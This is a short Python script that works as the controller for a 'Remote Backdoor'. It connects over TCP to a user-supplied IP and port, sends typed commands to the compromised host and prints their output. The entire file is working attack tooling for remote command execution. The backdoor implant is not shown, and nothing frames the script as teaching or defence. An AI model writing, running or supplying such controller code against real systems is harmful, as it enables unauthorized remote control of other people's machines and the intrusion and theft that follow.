#!/usr/bin/python3

import socket

serv_ip = input("Server IP: ")
serv_port = int(input("Server Port: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((serv_ip,serv_port))

print("Connected to Remote Backdoor")
header = (s.recv(1024)).decode('utf-8')
print(header)

while 1:
	command = input("> ")
	if (command == 'exit'): break

	b_message = bytes(command, 'utf-8')
	s.send(b_message)

	command_info = (s.recv(1024)).decode('utf-8')
	print(command_info)

s.close()